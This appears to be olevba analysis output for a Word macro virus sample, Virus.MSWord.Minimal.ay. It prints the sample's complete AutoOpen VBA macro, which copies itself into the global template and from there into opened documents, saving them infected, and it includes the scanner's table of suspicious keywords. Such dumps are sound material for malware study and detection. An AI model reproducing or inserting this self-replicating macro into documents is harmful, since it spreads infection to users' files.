olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.ay-2afe23685f21a8a45ce7ee3b3b1fe268eccb10e0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.ay-2afe23685f21a8a45ce7ee3b3b1fe268eccb10e0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Minimal.ay-2afe23685f21a8a45ce7ee3b3b1fe268eccb10e0 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Document$
Dim Copiaen$
    On Error GoTo -1: On Error GoTo unerror
    
    Document$ = WordBasic.[FileNameFromWindow$](0)
    Copiaen$ = Document$ + ":" + "AutoOpen"
    WordBasic.MacroCopy Copiaen$, "Global:AutoOpen"
    GoTo fin

unerror:
    WordBasic.FileSaveAs Name:=Document$, Format:=1
    WordBasic.MacroCopy "Global:AutoOpen", Copiaen$
    Err.Number = 0
 
fin:
WordBasic.FileSaveAll 1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

